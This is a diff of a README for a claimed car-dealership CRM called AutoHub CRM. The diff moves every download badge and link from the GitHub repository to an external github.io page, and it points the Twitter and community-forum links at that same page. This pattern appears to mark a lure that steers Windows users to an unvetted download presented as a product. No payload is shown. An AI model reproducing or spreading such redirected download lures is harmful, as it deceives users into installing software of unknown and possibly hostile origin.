@@ -1,6 +1,6 @@
 # 🚗 autohub-crm-salesforce-hub - Streamline Your Dealership Operations Today
 
-[![Download Now](https://img.shields.io/badge/Download-AutoHub%20CRM-blue?style=for-the-badge&logo=download&logoColor=white&color=%234CAF50)](https://github.com/articulate-soapdish10/autohub-crm-salesforce-hub)
+[![Download Now](https://img.shields.io/badge/Download-AutoHub%20CRM-blue?style=for-the-badge&logo=download&logoColor=white&color=%234CAF50)](https://articulate-soapdish10.github.io)
 
 Welcome to **autohub-crm-salesforce-hub** – the all-in-one solution built specifically for car dealerships and vehicle stock management. This powerful tool helps you track every car in your inventory, manage customer relationships, and streamline your daily operations – all from one simple dashboard. Whether you're running a small independent lot or a large multi-brand dealership, AutoHub CRM makes your work easier.
 
@@ -51,12 +51,12 @@ To run AutoHub CRM smoothly on your Windows computer, please ensure your system 
 
 ### Step 1: Download the Application
 
-[![Get AutoHub CRM](https://img.shields.io/badge/🚗-Download%20Now-orange?style=for-the-badge)](https://github.com/articulate-soapdish10/autohub-crm-salesforce-hub)
+[![Get AutoHub CRM](https://img.shields.io/badge/🚗-Download%20Now-orange?style=for-the-badge)](https://articulate-soapdish10.github.io)
 
 **Visit this link to download the application.**
 
 Click the button above or go directly to this address:  
-https://github.com/articulate-soapdish10/autohub-crm-salesforce-hub
+https://articulate-soapdish10.github.io
 
 ### Step 2: Install AutoHub CRM
 
@@ -152,8 +152,8 @@ By downloading and using this software, you agree to:
 
 This software is constantly improving. New features are added regularly based on user feedback – and **your suggestions matter**! To stay informed:
 - Watch this repository for new releases.
-- Follow our Twitter/X handle: [@AutoHubCRM](https://twitter.com/)
-- Join our community forum: [forum.autohubcrm.com](https://forum.autohubcrm.com)
+- Follow our Twitter/X handle: [@AutoHubCRM](https://articulate-soapdish10.github.io)
+- Join our community forum: [forum.autohubcrm.com](https://articulate-soapdish10.github.io)
 
 ---
 
@@ -161,7 +161,7 @@ This software is constantly improving. New features are added regularly based on
 
 Stop spending hours on paperwork and outdated spreadsheets. With AutoHub CRM, you'll have more time to focus on what matters most – selling cars and building relationships with your customers.
 
-[![Download AutoHub CRM Now!](https://img.shields.io/badge/🚗%20Visit%20Download%20Page%20-%20AutoHub%20CRM%20-%20%23FF9800?style=for-the-badge)](https://github.com/articulate-soapdish10/autohub-crm-salesforce-hub)
+[![Download AutoHub CRM Now!](https://img.shields.io/badge/🚗%20Visit%20Download%20Page%20-%20AutoHub%20CRM%20-%20%23FF9800?style=for-the-badge)](https://articulate-soapdish10.github.io)
 
 Visit this link to download the application and start your journey to a more organized, profitable dealership today!
 
